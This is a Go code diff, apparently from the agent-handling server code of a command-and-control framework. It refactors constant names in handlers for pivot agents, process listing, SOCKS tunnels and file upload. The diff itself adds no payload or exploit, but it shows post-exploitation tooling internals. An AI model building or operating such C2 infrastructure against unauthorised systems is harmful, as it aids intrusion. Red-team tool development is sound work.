-				Ts.TsAgentConsoleOutput(childAgentId, MESSAGE_SUCCESS, task.Message, "\n", true)
+				Ts.TsAgentConsoleOutput(childAgentId, adaptix.MESSAGE_SUCCESS, task.Message, "\n", true)
 			} else if linkType == 2 {
 				task.Message = fmt.Sprintf("----- New TCP pivot agent: [%s]===[%s] -----", agentData.Id, childAgentId)
-				Ts.TsAgentConsoleOutput(childAgentId, MESSAGE_SUCCESS, task.Message, "\n", true)
+				Ts.TsAgentConsoleOutput(childAgentId, adaptix.MESSAGE_SUCCESS, task.Message, "\n", true)
 			}
 
 		case COMMAND_LS:
@@ -1844,7 +1816,7 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 				}
 				errorCode := packer.ParseInt32()
 				task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, Ts.TsWin32Error(errorCode))
-				task.MessageType = MESSAGE_ERROR
+				task.MessageType = adaptix.MESSAGE_ERROR
 
 			} else {
 				if false == packer.CheckPacker([]string{"array", "int"}) {
@@ -2008,14 +1980,14 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 			if result == 0 {
 				errorCode := packer.ParseInt32()
 				task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, Ts.TsWin32Error(errorCode))
-				task.MessageType = MESSAGE_ERROR
+				task.MessageType = adaptix.MESSAGE_ERROR
 
 			} else {
 				processCount := int(packer.ParseInt32())
 
 				if processCount == 0 {
 					task.Message = "Failed to get process list"
-					task.MessageType = MESSAGE_ERROR
+					task.MessageType = adaptix.MESSAGE_ERROR
 					break
 				}
 
@@ -2203,9 +2175,9 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 			} else if result == 1 {
 				Ts.TsTunnelConnectionClose(channelId)
 			} else {
-				errorCode := SOCKS5_HOST_UNREACHABLE
+				errorCode := adaptix.SOCKS5_HOST_UNREACHABLE
 				if result == 10061 { // WSAECONNREFUSED
-					errorCode = SOCKS5_CONNECTION_REFUSED
+					errorCode = adaptix.SOCKS5_CONNECTION_REFUSED
 				}
 				Ts.TsTunnelConnectionHalt(channelId, errorCode)
 			}
@@ -2234,9 +2206,9 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 			}
 
 			if err != nil {
-				task.MessageType = MESSAGE_ERROR
+				task.MessageType = adaptix.MESSAGE_ERROR
 			} else {
-				task.MessageType = MESSAGE_SUCCESS
+				task.MessageType = adaptix.MESSAGE_SUCCESS
 			}
 
 		case COMMAND_TUNNEL_ACCEPT:
@@ -2286,11 +2258,11 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 			if pivotType != 0 {
 				_ = Ts.TsPivotDelete(pivotId)
 				if TaskId == 0 {
-					Ts.TsAgentConsoleOutput(parentAgentId, MESSAGE_SUCCESS, messageParent, "\n", true)
+					Ts.TsAgentConsoleOutput(parentAgentId, adaptix.MESSAGE_SUCCESS, messageParent, "\n", true)
 				} else {
 					task.Message = messageParent
 				}
-				Ts.TsAgentConsoleOutput(childAgentId, MESSAGE_SUCCESS, messageChild, "\n", true)
+				Ts.TsAgentConsoleOutput(childAgentId, adaptix.MESSAGE_SUCCESS, messageChild, "\n", true)
 			}
 
 		case COMMAND_UPLOAD:
@@ -2303,7 +2275,7 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 			}
 			errorCode := packer.ParseInt32()
 			task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, Ts.TsWin32Error(errorCode))
-			task.MessageType = MESSAGE_ERROR
+			task.MessageType = adaptix.MESSAGE_ERROR
 
 		default:
 			continue
